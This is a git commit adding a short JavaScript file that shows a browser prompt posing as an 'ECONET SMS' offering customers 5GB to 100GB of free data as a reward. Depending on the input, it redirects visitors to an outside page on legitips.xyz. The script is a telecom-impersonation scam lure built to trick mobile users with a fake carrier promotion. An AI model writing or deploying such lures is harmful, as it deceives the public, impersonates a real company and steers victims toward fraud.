687228112a615940b9cf9cf1abc620edfa7133d0
legitips <83867893+legitips@users.noreply.github.com>
2024-09-03 04:57:10 -0700

    Create activation-ecofreedata.js

---
+++ activation-ecofreedata.js
@@ -0,0 +1,5 @@
+var password = '1'
+password=prompt('ECONET SMS: Dear customer, kindly check if your Econet sim card is qualify to receive from 5GB to 100GB data, old customers Reward, press 1 to check now ','1');
+if (password != '1') {
+location.href='https://legitips.xyz/ecofreedata.html';
+}
